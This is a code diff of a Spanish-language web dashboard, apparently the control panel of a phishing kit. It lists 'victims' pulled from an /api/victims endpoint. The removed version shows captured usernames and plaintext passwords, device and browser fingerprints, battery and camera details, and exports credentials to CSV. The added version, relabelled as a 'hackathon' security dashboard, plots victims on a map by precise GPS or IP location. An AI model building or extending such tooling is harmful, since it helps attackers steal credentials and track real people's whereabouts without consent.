@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Avanzado - Phishing Analytics</title>
+    <title>APEX Dashboard - Análisis de Seguridad</title>
+    
+    <!-- Leaflet CSS (alternativa gratuita a Google Maps) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
     <style>
         * {
             margin: 0;
@@ -16,7 +20,6 @@
             background: #0a0e27;
             color: #e0e0e0;
             padding: 20px;
-            line-height: 1.6;
         }
         
         .header {
@@ -37,11 +40,6 @@
             margin-bottom: 10px;
         }
         
-        .header p {
-            color: #888;
-            font-size: 16px;
-        }
-        
         .controls {
             margin-bottom: 25px;
             display: flex;
@@ -60,7 +58,6 @@
             font-weight: bold;
             font-size: 15px;
             transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
         }
         
         button:hover {
@@ -70,10 +67,6 @@
         
         button.danger {
             background: linear-gradient(135deg, #ff3333, #ff6b6b);
-        }
-        
-        button.secondary {
-            background: linear-gradient(135deg, #667eea, #764ba2);
         }
         
         .stats {
@@ -99,130 +92,128 @@
         }
         
         .stat-card h3 {
-            font-size: 13px;
+            font-size: 14px;
             color: #00ff88;
             margin-bottom: 15px;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
         
         .stat-card .number {
-            font-size: 42px;
+            font-size: 36px;
             font-weight: bold;
-            background: linear-gradient(135deg, #00ff88, #00d4ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #00d4ff;
         }
         
-        .victims-section {
-            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
-            padding: 30px;
+        /* MAPA */
+        .map-container {
+            background: #1a1f3a;
+            padding: 20px;
             border-radius: 12px;
-            border: 1px solid #00ff8844;
-            margin-bottom: 20px;
+            border: 1px solid #00ff88;
+            margin-bottom: 30px;
         }
         
-        .victims-section h2 {
-            margin-bottom: 25px;
+        .map-container h2 {
+            color: #00ff88;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        #map {
+            height: 500px;
+            border-radius: 8px;
+            border: 2px solid #00d4ff;
+        }
+        
+        .map-legend {
+            margin-top: 15px;
+            padding: 10px;
+            background: #0a0e27;
+            border-radius: 5px;
+            font-size: 13px;
+        }
+        
+        .legend-item {
+            display: inline-block;
+            margin-right: 20px;
+        }
+        
+        .legend-dot {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .legend-dot.ip { background: #ff6b6b; }
+        .legend-dot.gps { background: #00ff88; }
+        
+        /* TABLA */
+        .victims-table {
+            background: #1a1f3a;
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid #00ff88;
+            overflow-x: auto;
+        }
+        
+        .victims-table h2 {
+            margin-bottom: 20px;
             font-size: 28px;
             color: #00ff88;
         }
         
-        .filter-bar {
-            margin-bottom: 20px;
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        
-        .filter-bar input,
-        .filter-bar select {
-            background: #0a0e27;
-            color: #e0e0e0;
-            border: 1px solid #00ff8844;
-            padding: 10px 15px;
-            border-radius: 6px;
+        table {
+            width: 100%;
+            border-collapse: collapse;
             font-size: 14px;
         }
         
-        .victim-card {
+        th, td {
+            padding: 14px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        
+        th {
             background: #0a0e27;
-            border: 1px solid #00ff8833;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 15px;
-            transition: all 0.3s;
-        }
-        
-        .victim-card:hover {
-            border-color: #00ff88;
-            box-shadow: 0 4px 15px rgba(0,255,136,0.2);
-            transform: translateX(5px);
-        }
-        
-        .victim-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #00ff8822;
-        }
-        
-        .victim-header h3 {
             color: #00ff88;
-            font-size: 20px;
-        }
-        
-        .victim-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            background: rgba(0,255,136,0.2);
-            border-radius: 12px;
-            font-size: 12px;
-            color: #00ff88;
-            margin-left: 8px;
-        }
-        
-        .victim-details {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-        }
-        
-        .detail-section {
-            background: #1a1f3a;
-            padding: 15px;
-            border-radius: 8px;
-            border-left: 3px solid #00ff88;
-        }
-        
-        .detail-section h4 {
-            color: #00d4ff;
-            margin-bottom: 10px;
-            font-size: 14px;
-            text-transform: uppercase;
-        }
-        
-        .detail-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 13px;
-        }
-        
-        .detail-label {
-            color: #888;
-        }
-        
-        .detail-value {
-            color: #e0e0e0;
-            font-weight: 500;
-        }
-        
-        .password-value {
-            color: #ffff00;
             font-weight: bold;
+            text-transform: uppercase;
+            font-size: 12px;
+        }
+        
+        tr:hover {
+            background: #2a2f4a;
+        }
+        
+        .location-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        
+        .location-ip {
+            background: #ff6b6b44;
+            color: #ff6b6b;
+        }
+        
+        .location-gps {
+            background: #00ff8844;
+            color: #00ff88;
+        }
+        
+        .coords-link {
+            color: #00d4ff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .coords-link:hover {
+            text-decoration: underline;
         }
         
         .loading {
@@ -233,412 +224,314 @@
         }
         
         .spinner {
-            border: 4px solid rgba(0,255,136,0.1);
+            border: 4px solid rgba(0,255,136,0.3);
             border-top: 4px solid #00ff88;
             border-radius: 50%;
             width: 50px;
             height: 50px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 0 auto 20px;
         }
         
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        .empty-state {
-            text-align: center;
-            padding: 60px;
-            color: #666;
-        }
-        
-        .fingerprint-hash {
-            font-family: 'Courier New', monospace;
-            color: #00d4ff;
-            font-size: 11px;
-            margin-top: 5px;
-        }
-        
-        .expand-btn {
-            background: #2d1b3d;
-            color: #00ff88;
-            border: 1px solid #00ff8844;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 12px;
-            margin-top: 10px;
-            transition: all 0.3s;
-        }
-        
-        .expand-btn:hover {
-            background: #00ff8822;
-            border-color: #00ff88;
-        }
-        
-        .hidden-details {
-            display: none;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #00ff8822;
-        }
-        
-        .hidden-details.show {
-            display: block;
-        }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🎯 PHISHING ANALYTICS v2.0</h1>
-        <p>Sistema Avanzado de Captura y Análisis de Datos</p>
+        <h1>🎯 APEX DASHBOARD</h1>
+        <p>Sistema de Análisis de Seguridad - Hackathon 2025</p>
     </div>
     
     <div class="controls">
         <button onclick="loadData()">🔄 Actualizar</button>
         <button onclick="clearData()" class="danger">🗑️ Limpiar Datos</button>
-        <button onclick="exportData()" class="secondary">💾 Exportar JSON</button>
-        <button onclick="exportCSV()" class="secondary">📊 Exportar CSV</button>
+        <button onclick="exportData()">💾 Exportar JSON</button>
+        <button onclick="toggleMapView()">🗺️ Alternar Vista</button>
     </div>
     
     <div class="stats">
         <div class="stat-card">
-            <h3>👥 Víctimas Totales</h3>
+            <h3>Víctimas Totales</h3>
             <div class="number" id="totalVictims">0</div>
         </div>
         <div class="stat-card">
-            <h3>🌍 Países</h3>
+            <h3>Países Únicos</h3>
             <div class="number" id="uniqueCountries">0</div>
         </div>
         <div class="stat-card">
-            <h3>🏙️ Ciudades</h3>
-            <div class="number" id="uniqueCities">0</div>
+            <h3>Ubicaciones GPS</h3>
+            <div class="number" id="gpsLocations">0</div>
         </div>
         <div class="stat-card">
-            <h3>📱 Móviles</h3>
-            <div class="number" id="mobileDevices">0</div>
-        </div>
-        <div class="stat-card">
-            <h3>💻 Desktops</h3>
-            <div class="number" id="desktopDevices">0</div>
-        </div>
-        <div class="stat-card">
-            <h3>🕐 Última Captura</h3>
+            <h3>Última Captura</h3>
             <div class="number" id="lastCapture" style="font-size: 16px;">-</div>
         </div>
     </div>
     
-    <div class="victims-section">
-        <h2>📋 Registro Detallado de Víctimas</h2>
-        
-        <div class="filter-bar">
-            <input type="text" id="searchInput" placeholder="🔍 Buscar..." onkeyup="filterVictims()">
-            <select id="deviceFilter" onchange="filterVictims()">
-                <option value="">Todos los dispositivos</option>
-                <option value="Mobile">📱 Móviles</option>
-                <option value="Desktop">💻 Desktops</option>
-                <option value="Tablet">📱 Tablets</option>
-            </select>
-            <select id="osFilter" onchange="filterVictims()">
-                <option value="">Todos los SO</option>
-            </select>
+    <!-- MAPA INTERACTIVO -->
+    <div class="map-container" id="mapContainer">
+        <h2>🗺️ Mapa de Ubicaciones</h2>
+        <div id="map"></div>
+        <div class="map-legend">
+            <span class="legend-item">
+                <span class="legend-dot ip"></span>
+                <span>Ubicación por IP (aproximada)</span>
+            </span>
+            <span class="legend-item">
+                <span class="legend-dot gps"></span>
+                <span>Ubicación GPS (precisa)</span>
+            </span>
         </div>
-        
-        <div id="victimsContainer" class="loading">
+    </div>
+    
+    <!-- TABLA DE VÍCTIMAS -->
+    <div class="victims-table">
+        <h2>📋 Registro de Víctimas</h2>
+        <div id="tableContainer" class="loading">
             <div class="spinner"></div>
             <p>Cargando datos...</p>
         </div>
     </div>
 
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
     <script>
-        let victimsData = [];
-        let lastDataHash = '';
-
-        async function loadData() {
-            try {
-                const response = await fetch('/api/victims');
-                const newData = await response.json();
-
-                // Crear hash simple de los datos para detectar cambios
-                const newHash = JSON.stringify(newData);
-
-                // Solo actualizar si los datos cambiaron
-                if (newHash !== lastDataHash) {
-                    victimsData = newData;
-                    lastDataHash = newHash;
-
-                    updateStats();
-                    renderVictims(victimsData);
-                    updateFilters();
-                } else {
-                    // Solo actualizar estadísticas (tiempo relativo)
-                    updateStats();
-                }
-
-            } catch (error) {
-                console.error('Error:', error);
-                document.getElementById('victimsContainer').innerHTML =
-                    '<div class="empty-state"><h3>❌ Error al cargar datos</h3><p>Verifica que el servidor esté activo</p></div>';
+        let map;
+        let markers = [];
+        let mapVisible = true;
+        
+        // Inicializar mapa
+        function initMap() {
+            if (map) {
+                map.remove();
             }
+            
+            // Crear mapa centrado en el mundo
+            map = L.map('map').setView([20, 0], 2);
+            
+            // Añadir tiles (OpenStreetMap - gratis)
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap',
+                maxZoom: 19
+            }).addTo(map);
         }
         
-        function updateStats() {
-            document.getElementById('totalVictims').textContent = victimsData.length;
-            
-            const uniqueCountries = [...new Set(victimsData.map(v => v.network?.country || 'Unknown'))];
-            document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
-            
-            const uniqueCities = [...new Set(victimsData.map(v => v.network?.city || 'Unknown'))];
-            document.getElementById('uniqueCities').textContent = uniqueCities.length;
-            
-            const mobileCount = victimsData.filter(v => v.device?.type === 'Mobile').length;
-            document.getElementById('mobileDevices').textContent = mobileCount;
-            
-            const desktopCount = victimsData.filter(v => v.device?.type === 'Desktop').length;
-            document.getElementById('desktopDevices').textContent = desktopCount;
-            
-            if (victimsData.length > 0) {
-                const lastVictim = victimsData[victimsData.length - 1];
-                const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
-                document.getElementById('lastCapture').textContent = timeAgo;
-            }
-        }
-        
-        function updateFilters() {
-            const osSet = [...new Set(victimsData.map(v => v.os?.name || 'Unknown'))];
-            const osFilter = document.getElementById('osFilter');
-            osFilter.innerHTML = '<option value="">Todos los SO</option>';
-            osSet.forEach(os => {
-                const option = document.createElement('option');
-                option.value = os;
-                option.textContent = getOSIcon(os) + ' ' + os;
-                osFilter.appendChild(option);
+        // Agregar marcador al mapa
+        function addMarker(lat, lon, info, isGPS) {
+            const color = isGPS ? '#00ff88' : '#ff6b6b';
+            const icon = L.divIcon({
+                className: 'custom-marker',
+                html: `<div style="background: ${color}; width: 20px; height: 20px; border-radius: 50%; border: 3px solid white; box-shadow: 0 0 10px ${color};"></div>`,
+                iconSize: [20, 20]
             });
-        }
-        
-        function renderVictims(victims) {
-            const container = document.getElementById('victimsContainer');
             
-            if (victims.length === 0) {
-                container.innerHTML = '<div class="empty-state"><h3>📭 Sin víctimas capturadas</h3><p>Esperando conexiones...</p></div>';
-                return;
-            }
+            const marker = L.marker([lat, lon], { icon: icon }).addTo(map);
             
-            container.innerHTML = '';
-            const reversedVictims = [...victims].reverse();
-            reversedVictims.forEach((victim, index) => {
-                const card = createVictimCard(victim, victims.length - index);
-                container.appendChild(card);
-            });
-        }
-        
-        function createVictimCard(victim, number) {
-            const card = document.createElement('div');
-            card.className = 'victim-card';
-            
-            const date = new Date(victim.timestamp).toLocaleString('es-MX');
-            
-            card.innerHTML = `
-                <div class="victim-header">
-                    <div>
-                        <h3>${getDeviceIcon(victim.device?.type)} ${victim.username || 'Visitor'}</h3>
-                        <span class="victim-badge">#${number}</span>
-                        <span class="victim-badge">${victim.device?.type || 'Unknown'}</span>
-                        <div class="fingerprint-hash">🔐 ${victim.fingerprint}</div>
-                    </div>
-                    <div style="text-align: right; color: #888; font-size: 13px;">
-                        <div>🕐 ${date}</div>
-                        <div style="margin-top: 5px;">${getTimeAgo(new Date(victim.timestamp))}</div>
-                    </div>
-                </div>
-                
-                <div class="victim-details">
-                    <div class="detail-section">
-                        <h4>🔐 Credenciales</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Usuario:</span>
-                            <span class="detail-value">${victim.username || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Contraseña:</span>
-                            <span class="password-value">${victim.password || 'N/A'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>🌐 Red</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">IP:</span>
-                            <span class="detail-value">${victim.network?.ip || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">País:</span>
-                            <span class="detail-value">${victim.network?.country || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Ciudad:</span>
-                            <span class="detail-value">${victim.network?.city || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Conexión:</span>
-                            <span class="detail-value">${victim.network?.connectionType || 'Unknown'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>${getDeviceIcon(victim.device?.type)} Dispositivo</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Tipo:</span>
-                            <span class="detail-value">${victim.device?.type || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Modelo:</span>
-                            <span class="detail-value">${victim.device?.model || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">CPU:</span>
-                            <span class="detail-value">${victim.device?.cpuCores || 'Unknown'} cores</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">RAM:</span>
-                            <span class="detail-value">${victim.device?.memory || 'Unknown'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>${getOSIcon(victim.os?.name)} Sistema</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">SO:</span>
-                            <span class="detail-value">${victim.os?.name || 'Unknown'} ${victim.os?.version || ''}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Navegador:</span>
-                            <span class="detail-value">${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Pantalla:</span>
-                            <span class="detail-value">${victim.screen?.resolution || 'Unknown'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>🔋 Batería</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Nivel:</span>
-                            <span class="detail-value">${victim.battery?.level || 'Unknown'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Cargando:</span>
-                            <span class="detail-value">${victim.battery?.charging ? '⚡ Sí' : '🔌 No'}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-section">
-                        <h4>🖱️ Comportamiento</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Mouse:</span>
-                            <span class="detail-value">${victim.behavior?.mouseMovements || 0} mov</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Clicks:</span>
-                            <span class="detail-value">${victim.behavior?.clicks || 0}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Tiempo:</span>
-                            <span class="detail-value">${victim.behavior?.timeOnPage || 0}s</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="expand-btn" onclick="toggleDetails(this)">🔍 Ver Más Detalles</button>
-                
-                <div class="hidden-details">
-                    <div class="victim-details">
-                        <div class="detail-section">
-                            <h4>🎨 GPU</h4>
-                            <div class="detail-item">
-                                <span class="detail-label">Vendor:</span>
-                                <span class="detail-value">${victim.fingerprints?.webglVendor || 'N/A'}</span>
-                            </div>
-                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
-                                <span class="detail-label">Renderer:</span>
-                                <span class="detail-value" style="font-size: 11px;">${victim.fingerprints?.webglRenderer || 'N/A'}</span>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-section">
-                            <h4>📸 Hardware</h4>
-                            <div class="detail-item">
-                                <span class="detail-label">Cámaras:</span>
-                                <span class="detail-value">${victim.hardware?.videoInputs || 'Unknown'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Micrófonos:</span>
-                                <span class="detail-value">${victim.hardware?.audioInputs || 'Unknown'}</span>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-section">
-                            <h4>🔐 Privacidad</h4>
-                            <div class="detail-item">
-                                <span class="detail-label">Cookies:</span>
-                                <span class="detail-value">${victim.browser?.cookiesEnabled ? '✅' : '❌'}</span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">DNT:</span>
-                                <span class="detail-value">${victim.browser?.doNotTrack || 'Unknown'}</span>
-                            </div>
-                        </div>
-                        
-                        ${victim.geolocation?.latitude ? `
-                        <div class="detail-section">
-                            <h4>🌍 GPS</h4>
-                            <div class="detail-item">
-                                <span class="detail-label">Coords:</span>
-                                <span class="detail-value">${victim.geolocation?.latitude?.toFixed(6)}, ${victim.geolocation?.longitude?.toFixed(6)}</span>
-                            </div>
-                            <div style="margin-top: 10px;">
-                                <a href="https://www.google.com/maps?q=${victim.geolocation?.latitude},${victim.geolocation?.longitude}" 
-                                   target="_blank" 
-                                   style="color: #00ff88;">
-                                   📍 Ver en Mapa
-                                </a>
-                            </div>
-                        </div>
-                        ` : ''}
-                    </div>
+            const popupContent = `
+                <div style="color: #000; font-size: 13px;">
+                    <strong>${info.username || 'Visitor'}</strong><br>
+                    <strong>IP:</strong> ${info.ip}<br>
+                    <strong>Ubicación:</strong> ${info.city}, ${info.country}<br>
+                    <strong>Tipo:</strong> ${isGPS ? '🎯 GPS Preciso' : '📍 IP Aproximado'}<br>
+                    ${isGPS ? `<strong>Coords:</strong> ${lat.toFixed(4)}, ${lon.toFixed(4)}<br>` : ''}
+                    <strong>Dispositivo:</strong> ${info.device}<br>
+                    <strong>Hora:</strong> ${new Date(info.timestamp).toLocaleString('es-MX')}<br>
+                    ${isGPS ? '<br><a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" style="color: #00d4ff;">Ver en Google Maps</a>' : ''}
                 </div>
             `;
             
-            return card;
+            marker.bindPopup(popupContent);
+            markers.push(marker);
+            
+            return marker;
         }
         
-        function toggleDetails(button) {
-            const details = button.nextElementSibling;
-            details.classList.toggle('show');
-            button.textContent = details.classList.contains('show') ? 
-                '🔼 Ocultar Detalles' : '🔍 Ver Más Detalles';
+        // Limpiar marcadores
+        function clearMarkers() {
+            markers.forEach(marker => marker.remove());
+            markers = [];
         }
         
-        function filterVictims() {
-            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const deviceFilter = document.getElementById('deviceFilter').value;
-            const osFilter = document.getElementById('osFilter').value;
-            
-            const filtered = victimsData.filter(victim => {
-                const matchesSearch = !searchTerm || 
-                    (victim.network?.ip || '').toLowerCase().includes(searchTerm) ||
-                    (victim.username || '').toLowerCase().includes(searchTerm) ||
-                    (victim.network?.city || '').toLowerCase().includes(searchTerm);
+        // Alternar vista del mapa
+        function toggleMapView() {
+            const mapContainer = document.getElementById('mapContainer');
+            mapVisible = !mapVisible;
+            mapContainer.style.display = mapVisible ? 'block' : 'none';
+        }
+        
+        // Cargar datos
+        async function loadData() {
+            try {
+                const response = await fetch('/api/victims');
+                const victims = await response.json();
                 
-                const matchesDevice = !deviceFilter || victim.device?.type === deviceFilter;
-                const matchesOS = !osFilter || victim.os?.name === osFilter;
+                // Actualizar estadísticas
+                document.getElementById('totalVictims').textContent = victims.length;
                 
-                return matchesSearch && matchesDevice && matchesOS;
-            });
+                const uniqueCountries = [...new Set(victims.map(v => v.network?.country || 'Unknown'))];
+                document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
+                
+                const gpsCount = victims.filter(v => v.geolocation?.latitude).length;
+                document.getElementById('gpsLocations').textContent = gpsCount;
+                
+                if (victims.length > 0) {
+                    const lastVictim = victims[victims.length - 1];
+                    const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
+                    document.getElementById('lastCapture').textContent = timeAgo;
+                }
+                
+                // Limpiar mapa
+                clearMarkers();
+                
+                // Agregar marcadores al mapa
+                victims.forEach(victim => {
+                    // Si tiene geolocalización GPS precisa
+                    if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
+                        addMarker(
+                            victim.geolocation.latitude,
+                            victim.geolocation.longitude,
+                            {
+                                username: victim.username,
+                                ip: victim.network?.ip || 'Unknown',
+                                city: victim.network?.city || 'Unknown',
+                                country: victim.network?.country || 'Unknown',
+                                device: `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`,
+                                timestamp: victim.timestamp
+                            },
+                            true // es GPS
+                        );
+                    }
+                    // Si solo tiene ubicación por IP (usar geoip-lite)
+                    else if (victim.network?.city !== 'Unknown') {
+                        // Necesitamos obtener coords aproximadas de la ciudad
+                        // Por ahora usaremos coordenadas de ejemplo basadas en la IP
+                        const ipCoords = getApproxCoordsFromGeoIP(victim);
+                        if (ipCoords) {
+                            addMarker(
+                                ipCoords.lat,
+                                ipCoords.lon,
+                                {
+                                    username: victim.username,
+                                    ip: victim.network?.ip || 'Unknown',
+                                    city: victim.network?.city || 'Unknown',
+                                    country: victim.network?.country || 'Unknown',
+                                    device: `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`,
+                                    timestamp: victim.timestamp
+                                },
+                                false // no es GPS, es IP
+                            );
+                        }
+                    }
+                });
+                
+                // Ajustar vista del mapa para mostrar todos los marcadores
+                if (markers.length > 0) {
+                    const group = L.featureGroup(markers);
+                    map.fitBounds(group.getBounds().pad(0.1));
+                }
+                
+                // Crear tabla
+                if (victims.length === 0) {
+                    document.getElementById('tableContainer').innerHTML = 
+                        '<p class="loading">No hay víctimas capturadas aún.</p>';
+                } else {
+                    let tableHTML = `
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Usuario</th>
+                                    <th>IP</th>
+                                    <th>Ubicación</th>
+                                    <th>Coordenadas</th>
+                                    <th>Dispositivo</th>
+                                    <th>Navegador</th>
+                                    <th>Fecha</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                    `;
+                    
+                    victims.reverse().forEach((victim, index) => {
+                        const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;
+                        const locationBadge = hasGPS 
+                            ? '<span class="location-badge location-gps">GPS</span>'
+                            : '<span class="location-badge location-ip">IP</span>';
+                        
+                        let coordsHTML = 'N/A';
+                        if (hasGPS) {
+                            const lat = victim.geolocation.latitude.toFixed(4);
+                            const lon = victim.geolocation.longitude.toFixed(4);
+                            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                            coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">${lat}, ${lon}</a>`;
+                        } else {
+                            const ipCoords = getApproxCoordsFromGeoIP(victim);
+                            if (ipCoords) {
+                                const googleMapsUrl = `https://www.google.com/maps?q=${ipCoords.lat},${ipCoords.lon}`;
+                                coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">~${ipCoords.lat.toFixed(2)}, ${ipCoords.lon.toFixed(2)}</a>`;
+                            }
+                        }
+                        
+                        const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
+                        const device = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
+                        const date = new Date(victim.timestamp).toLocaleString('es-MX');
+                        
+                        tableHTML += `
+                            <tr>
+                                <td>${victims.length - index}</td>
+                                <td><strong>${victim.username || 'Visitor'}</strong></td>
+                                <td>${victim.network?.ip || 'Unknown'}</td>
+                                <td>${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}</td>
+                                <td>${coordsHTML}</td>
+                                <td>${device}</td>
+                                <td>${browser}</td>
+                                <td>${date}</td>
+                            </tr>
+                        `;
+                    });
+                    
+                    tableHTML += '</tbody></table>';
+                    document.getElementById('tableContainer').innerHTML = tableHTML;
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('tableContainer').innerHTML = 
+                    '<p class="loading">❌ Error al cargar datos</p>';
+            }
+        }
+        
+        // Obtener coordenadas aproximadas desde geoip
+        function getApproxCoordsFromGeoIP(victim) {
+            // Primero intentar usar las coordenadas que vienen del backend (geoip-lite)
+            if (victim.network?.latitude && victim.network?.longitude) {
+                return {
+                    lat: victim.network.latitude,
+                    lon: victim.network.longitude
+                };
+            }
             
-            renderVictims(filtered);
+            // Fallback: coordenadas conocidas de ciudades
+            const cityCoords = {
+                'Juárez': { lat: 31.6904, lon: -106.4245 },
+                'Ciudad Juárez': { lat: 31.6904, lon: -106.4245 },
+                'Mexico City': { lat: 19.4326, lon: -99.1332 },
+                'Monterrey': { lat: 25.6866, lon: -100.3161 },
+                'Guadalajara': { lat: 20.6597, lon: -103.3496 },
+                'Tijuana': { lat: 32.5149, lon: -117.0382 },
+                'Chihuahua': { lat: 28.6353, lon: -106.0889 }
+            };
+            
+            const city = victim.network?.city;
+            if (city && cityCoords[city]) {
+                return cityCoords[city];
+            }
+            
+            return null;
         }
         
         function getTimeAgo(date) {
@@ -649,61 +542,38 @@
             return 'Hace ' + Math.floor(seconds / 86400) + ' días';
         }
         
-        function getDeviceIcon(type) {
-            const icons = {'Mobile': '📱', 'Desktop': '💻', 'Tablet': '📱', 'Unknown': '❓'};
-            return icons[type] || '❓';
-        }
-        
-        function getOSIcon(os) {
-            const icons = {'Windows': '🪟', 'macOS': '🍎', 'iOS': '📱', 'iPadOS': '📱', 'Android': '🤖', 'Linux': '🐧'};
-            return icons[os] || '❓';
-        }
-        
         async function clearData() {
-            if (confirm('⚠️ ¿Eliminar TODOS los datos?')) {
+            if (confirm('¿Seguro que quieres eliminar TODOS los datos?')) {
                 try {
                     await fetch('/api/clear', { method: 'DELETE' });
                     alert('✅ Datos eliminados');
                     loadData();
                 } catch (error) {
-                    alert('❌ Error');
+                    alert('❌ Error al eliminar datos');
                 }
             }
         }
         
         async function exportData() {
             try {
-                const blob = new Blob([JSON.stringify(victimsData, null, 2)], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
+                const response = await fetch('/api/victims');
+                const victims = await response.json();
+                
+                const dataStr = JSON.stringify(victims, null, 2);
+                const dataBlob = new Blob([dataStr], { type: 'application/json' });
+                
+                const url = URL.createObjectURL(dataBlob);
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = `victims_${Date.now()}.json`;
+                link.download = `victims_${new Date().toISOString()}.json`;
                 link.click();
-                URL.revokeObjectURL(url);
             } catch (error) {
                 alert('❌ Error al exportar');
             }
         }
         
-        async function exportCSV() {
-            try {
-                let csv = 'Timestamp,Username,Password,IP,Country,City,Device,OS,Browser,Battery\n';
-                victimsData.forEach(v => {
-                    csv += `"${v.timestamp}","${v.username}","${v.password}","${v.network?.ip}","${v.network?.country}","${v.network?.city}","${v.device?.type}","${v.os?.name}","${v.browser?.name}","${v.battery?.level}"\n`;
-                });
-                const blob = new Blob([csv], { type: 'text/csv' });
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = `victims_${Date.now()}.csv`;
-                link.click();
-                URL.revokeObjectURL(url);
-            } catch (error) {
-                alert('❌ Error al exportar CSV');
-            }
-        }
-        
-        // Cargar al inicio
+        // Inicializar
+        initMap();
         loadData();
         
         // Auto-refresh cada 5 segundos
